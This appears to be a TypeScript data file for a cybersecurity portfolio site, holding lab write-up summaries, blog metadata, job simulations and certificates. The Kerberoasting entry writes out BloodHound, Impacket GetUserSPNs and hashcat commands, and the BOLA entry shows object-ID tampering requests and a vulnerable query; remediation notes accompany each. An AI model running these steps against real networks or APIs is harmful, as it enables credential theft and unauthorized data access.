    id: 'bola-idor-walkthrough',
    title: 'API Exploitation: Hunting Broken Object-Level Authorization (BOLA)',
    platform: 'OWASP API Top 10 Lab · Medium Writeup',
    category: 'Web & API Security',
    difficulty: 'Medium',
    mitre: 'OWASP API1:2023',
    summary:
      'Demonstrating how valid JWT authentication tokens still lead to full horizontal data breaches when backend controllers fail to verify resource ownership on object IDs.',
    steps: [
      {
        stage: '01 / Endpoint Mapping in Burp Suite',
        detail: 'Captured authenticated REST API traffic while viewing an order summary in the frontend SPA.',
        cmd: 'GET /api/v1/orders/1042 HTTP/1.1\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIs...',
      },
      {
        stage: '02 / IDOR / BOLA Parameter Tampering',
        detail: 'Incremented the path parameter from `1042` to `1043` in Burp Repeater while keeping the original user JWT.',
        cmd: 'GET /api/v1/orders/1043 HTTP/1.1\nHTTP/1.1 200 OK -> { "order_id": 1043, "owner": "victim@corp.com", "pii": "..." }',
      },
      {
        stage: '03 / Automated Enumeration Check',
        detail: 'Verified the scope of unauthorized access across sequential IDs and documented the missing ownership predicate.',
        cmd: '# Vulnerable Query:\norder = db.query(Order).filter(Order.id == order_id).first()',
      },
    ],
    remediation:
      'Enforce strict object-level ownership checks on every query (`filter(Order.id == order_id, Order.user_id == current_user.id)`) and replace sequential integers with UUIDv4 identifiers.',
    tags: ['BOLA / IDOR', 'OWASP API1', 'Burp Suite Pro', 'JWT', 'FastAPI'],
  },
  {
    id: 'ad-kerberoasting-path',
    title: 'Active Directory: BloodHound Recon & Kerberoasting to Domain Admin',
    platform: 'Red Team AD Lab',
    category: 'Active Directory Exploitation',
    difficulty: 'Hard',
    mitre: 'T1558.003 / T1069.002',
    summary:
      'Enumerating Active Directory domain trusts and ACL attack paths with BloodHound, extracting Kerberos TGS tickets for service accounts with SPNs, and cracking RC4 hashes offline.',
    steps: [
      {
        stage: '01 / BloodHound Graph Collection',
        detail: 'Executed SharpHound / bloodhound-python from a low-privileged domain user foothold to map AD group memberships and ACL edges.',
        cmd: '$ bloodhound-python -u svc_help -p "Pass123!" -d corp.local -c All -ns 10.10.10.5',
      },
      {
        stage: '02 / SPN Discovery & Kerberoasting',
        detail: 'Queried domain controllers for user accounts with registered Service Principal Names (SPNs) and requested TGS tickets via Impacket.',
        cmd: '$ GetUserSPNs.py corp.local/svc_help:"Pass123!" -dc-ip 10.10.10.5 -request -outputfile tgs.hashes',
      },
      {
        stage: '03 / Offline Hashcat TGS Cracking',
        detail: 'Cracked the Kerberos 5 TGS-REP etype 23 ($krb5tgs$23$) ticket offline using Hashcat mode 13100 to recover the SQL service account password.',
        cmd: '$ hashcat -m 13100 tgs.hashes rockyou.txt --force\n$krb5tgs$23$*mssql_svc*... -> Cracked: SqlServer2025!',
      },
    ],
    remediation:
      'Migrate service accounts to Group Managed Service Accounts (gMSA) with 120-character rotating passwords, enforce AES-256 Kerberos encryption over RC4, and audit privileged ACL paths.',
    tags: ['Active Directory', 'BloodHound', 'Kerberoasting', 'Impacket', 'Hashcat'],
  },
  {
    id: 'dga-entropy-sinkhole',
    title: 'Network Forensics: Catching DGA Botnet Beacons with Shannon Entropy',
    platform: 'DNS Sinkhole Research Lab',
    category: 'Network Defense & Threat Intel',
    difficulty: 'Hard',
    mitre: 'T1568.002',
    summary:
      'Building a real-time UDP Port 53 packet analyzer that calculates character randomness (Shannon Entropy) on DNS queries to detect and sinkhole algorithmically generated C2 domains.',
    steps: [
      {
        stage: '01 / Live DNS Packet Interception',
        detail: 'Captured outbound DNS A/AAAA queries using Scapy & raw UDP sockets to inspect subdomain labels before upstream resolution.',
        cmd: '$ sudo python3 sinkhole.py --interface eth0 --port 53\n[CAPTURE] Query from 192.168.1.44 -> "x9k2m8a1p0z.ru."',
      },
      {
        stage: '02 / Shannon Entropy Scoring',
        detail: 'Computed H(X) = -Σ P(x) log2 P(x) on the second-level domain label; benign domains average H < 3.5 while random DGA strings exceed 4.1.',
        cmd: 'entropy("x9k2m8a1p0z") = 4.49 bits/char [THRESHOLD: 4.10 -> FLAGGED_DGA]',
      },
      {
        stage: '03 / Automated Quarantine Response',
        detail: 'Returned a sinkholed 0.0.0.0 DNS response to sever C2 check-in and logged the infected internal host to the HUD dashboard.',
        cmd: '[SINKHOLE] Responded 0.0.0.0 for x9k2m8a1p0z.ru | Quarantined host 192.168.1.44',
      },
    ],
    remediation:
      'Combine DNS entropy scoring with threat intelligence feeds, enforce DNS-over-HTTPS (DoH) egress policies through internal resolvers, and isolate hosts exhibiting periodic beacon jitter.',
    tags: ['DNS Sinkhole', 'Shannon Entropy', 'Scapy', 'Botnet C2', 'Network Forensics'],
  },
]

export type BlogPost = {
  id: string
  title: string
  date: string
  readTime: string
  summary: string
  snippet: string
  tags: string[]
  url: string
}

export const blogPosts: BlogPost[] = [
  {
    id: 'bola-idor-api',
    title: 'Change One Digit in the URL. See Someone Else’s Data',
    date: 'Nov 5, 2026',
    readTime: '5 min read',
    summary:
      'How Broken Object-Level Authorization (BOLA / IDOR) sits at the top of the OWASP API Security Top 10, why frontend developers spot API trust flaws faster, and how my lab-to-tool workflow behind NexShield and DNS Sinkhole works.',
    snippet: 'GET /api/v1/orders/1042 -> 200 OK (my order)\nGET /api/v1/orders/1043 -> 200 OK (someone else\'s order)',
    tags: ['API Security', 'BOLA / IDOR', 'OWASP Top 10', 'Cybersecurity', 'AI'],
    url: 'https://medium.com/@giridharank790/change-one-digit-in-the-url-see-someone-elses-data-3eceb08756ab',
  },
  {
    id: 'understanding-malware',
    title: 'Understanding Malware: Types, Detection, and Defense Strategies',
    date: 'Aug 13, 2026',
    readTime: '8 min read',
    summary:
      'A technical guide to thinking about malware in terms of kill-chain stages rather than family names — covering payload delivery, persistence, C2 beacons, YARA & Suricata detection, and safe sandbox detonation with Any.Run and REMnux.',
    snippet: 'Delivery -> Exploitation -> Persistence -> C2 Check-In -> Actions on Objective (MITRE ATT&CK)',
    tags: ['Malware Analysis', 'MITRE ATT&CK', 'YARA & Suricata', 'Incident Response', 'SOC'],
    url: 'https://medium.com/@giridharank790/understanding-malware-types-detection-and-defense-strategies-00aa35f15696',
  },
]

export const experience = [
  {
    role: 'Cyber Security Intern',
    company: 'Future Interns',
    type: 'Internship · 1 month',
    details: 'Analysed phishing email signatures, API threats, payload validation and web threat tracking.',
    cert: '/certificates/GIRIDHARAN_K_Certificate.pdf',
  },
  {
    role: 'Cyber Security — Incident Response',
    company: 'Telstra',
    type: 'Job simulation',
    details: 'Cyber attack triage, incident containment, malware payload analysis and network isolation.',
    cert: '/certificates/cyber_security_1.pdf',
  },
  {
    role: 'Cybersecurity — IAM & SOC',
    company: 'Tata Consultancy Services',
    type: 'Job simulation',
    details: 'Identity & access management, SOC triage and vulnerability assessment frameworks.',
    cert: '/certificates/cyber_security_2.pdf',
  },
  {
    role: 'Software Engineering',
    company: 'JPMorgan Chase & Co.',
    type: 'Job simulation',
    details: 'Financial data visualisers, stock feed ingestion pipelines and unit testing suites.',
    cert: '/certificates/jpmorgan_swe.pdf',
  },
  {
    role: 'Technology Consulting',
    company: 'Deloitte',
    type: 'Job simulation',
    details: 'Cloud migration roadmaps, technology frameworks and security governance checkpoints.',
    cert: '/certificates/deloitte_tech.pdf',
  },
  {
    role: 'Strategy Consulting',
    company: 'Boston Consulting Group',
    type: 'Job simulation',
    details: 'Strategic technology analysis, market assessment modelling and systems design.',
    cert: '/certificates/bcg_strategy.pdf',
  },
]

export type CertCategory = 'Security' | 'Cloud & Data' | 'AI' | 'Enterprise'

export type Cert = { title: string; issuer: string; category: CertCategory; file: string }

export const certCategories: CertCategory[] = ['Security', 'Cloud & Data', 'AI', 'Enterprise']

export const certs: Cert[] = [
  { title: 'Cyber Security Internship', issuer: 'Future Interns', category: 'Security', file: 'GIRIDHARAN_K_Certificate.pdf' },
  { title: 'Cyber Security I — Advanced Principles', issuer: 'Telstra', category: 'Security', file: 'cyber_security_1.pdf' },
  { title: 'Cyber Security II — Advanced Threats', issuer: 'TCS', category: 'Security', file: 'cyber_security_2.pdf' },
  { title: 'Cyber Security III — Network Security', issuer: 'Network Defense', category: 'Security', file: 'cyber_security_3.pdf' },
  { title: 'Cyber Security IV — Ethical Hacking', issuer: 'Offensive Security', category: 'Security', file: 'cyber_security_4.pdf' },
  { title: 'Cyber Security V — Threat Intel', issuer: 'Threat Intelligence', category: 'Security', file: 'cyber_security_5.pdf' },
  { title: 'Introduction to CIP', issuer: 'Critical Infrastructure Protection', category: 'Security', file: 'introduction_to_cip.png' },
  { title: 'Linux Administration', issuer: 'Enterprise Linux', category: 'Security', file: 'linux_administration.pdf' },
  { title: 'AWS Solutions Architecture', issuer: 'AWS', category: 'Cloud & Data', file: 'aws_certified.pdf' },
  { title: 'Azure Tools Solution', issuer: 'Microsoft Azure', category: 'Cloud & Data', file: 'azure_tools.pdf' },
  { title: 'MongoDB Developer', issuer: 'MongoDB', category: 'Cloud & Data', file: 'mongodb.pdf' },
  { title: 'Big Data & Analytics', issuer: 'Data Engineering', category: 'Cloud & Data', file: 'big_data.png' },
  { title: 'Python Programming', issuer: 'Python', category: 'Cloud & Data', file: 'python.pdf' },
  { title: 'IT Architecture & Strategy', issuer: 'BCG', category: 'Cloud & Data', file: 'bcg_strategy.pdf' },
  { title: 'AI & ChatGPT Prompt Engineering', issuer: 'Generative AI', category: 'AI', file: 'ai_chatgpt.png' },
  { title: 'Claude AI — Essentials', issuer: 'Anthropic', category: 'AI', file: 'claude_ai_1.pdf' },
  { title: 'Claude AI — API Workflows', issuer: 'Anthropic', category: 'AI', file: 'claude_ai_2.pdf' },
  { title: 'Claude AI — Security Engineering', issuer: 'Anthropic', category: 'AI', file: 'claude_ai_3.pdf' },
  { title: 'Claude AI — Optimization', issuer: 'Anthropic', category: 'AI', file: 'claude_ai_4.pdf' },
  { title: 'Software Engineering Simulation', issuer: 'JPMorgan Chase & Co.', category: 'Enterprise', file: 'jpmorgan_swe.pdf' },
  { title: 'Technology Consulting', issuer: 'Deloitte', category: 'Enterprise', file: 'deloitte_tech.pdf' },
  { title: 'Microsoft Training — Technical', issuer: 'Microsoft', category: 'Enterprise', file: 'microsoft_training.pdf' },
  { title: 'Microsoft Learn Professional', issuer: 'Microsoft', category: 'Enterprise', file: 'microsoft_learn.pdf' },
  { title: 'Teams for Education', issuer: 'Microsoft', category: 'Enterprise', file: 'microsoft_teams.pdf' },
  { title: 'Microsoft 365 Education', issuer: 'Microsoft', file: 'microsoft_365.pdf', category: 'Enterprise' },
]

export const thmBadges = [
  { name: 'Terminaled', sub: 'Linux CLI Mastery' },
  { name: 'Mr. Robot CTF', sub: 'Privilege Escalation' },
  { name: 'Defrosted Five', sub: 'Security Challenge' },
  { name: 'Security Engineering', sub: 'Defensive Architecture' },
  { name: 'Web Fundamentals', sub: 'OWASP Exploitation' },
  { name: 'Bronze League', sub: 'Global Top 20%' },
  { name: 'World Wide Web', sub: 'Attack Surface Recon' },
]
